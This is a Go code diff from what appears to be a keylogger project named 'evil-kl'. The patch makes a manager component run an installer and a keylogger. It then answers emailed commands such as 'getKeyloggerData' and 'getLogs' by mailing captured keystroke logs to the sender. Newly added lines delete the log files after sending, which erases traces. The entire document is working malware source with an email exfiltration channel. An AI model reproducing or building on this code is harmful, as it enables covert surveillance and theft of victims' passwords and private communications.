@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"os"
 
 	logger "github.com/dm1trypon/easy-logger"
 	"github.com/dm1trypon/evil-kl/internal/app/api"
@@ -43,10 +44,12 @@ func (m *Manager) Run() {
 
 	go m.errorHandler()
 
-	m.installerInst.Run()
+	if m.installerInst.Run() {
+		m.chCritError <- true
+		return
+	}
 
 	m.klInst.SetLogsPath(m.cfg.Keylogger.Path)
-	m.klInst.SetLogsFileName(m.cfg.Keylogger.Name)
 	m.klInst.Run()
 
 	go m.mailHandler()
@@ -61,9 +64,6 @@ func (m *Manager) Run() {
 // errorHandler <Manager> - checking for critical service errors
 func (m *Manager) errorHandler() {
 	select {
-	case <-m.installerInst.GetChCritError():
-		m.chCritError <- true
-		return
 	case <-m.mailInst.GetChCritError():
 		m.chCritError <- true
 		return
@@ -124,9 +124,11 @@ func (m *Manager) task(body []byte, from string) {
 		if method == "getKeyloggerData" {
 			msg, path := m.apiInst.GetKeyloggerData(method)
 			m.mailInst.Send(from, "Subject", msg, path)
+			os.Remove(path)
 		} else if method == "getLogs" {
 			msg, path := m.apiInst.GetLogs(method)
 			m.mailInst.Send(from, "Subject", msg, path)
+			os.Remove(path)
 		} else if method == "ping" {
 			msg, path := m.apiInst.Ping(method)
 			m.mailInst.Send(from, "Subject", msg, path)
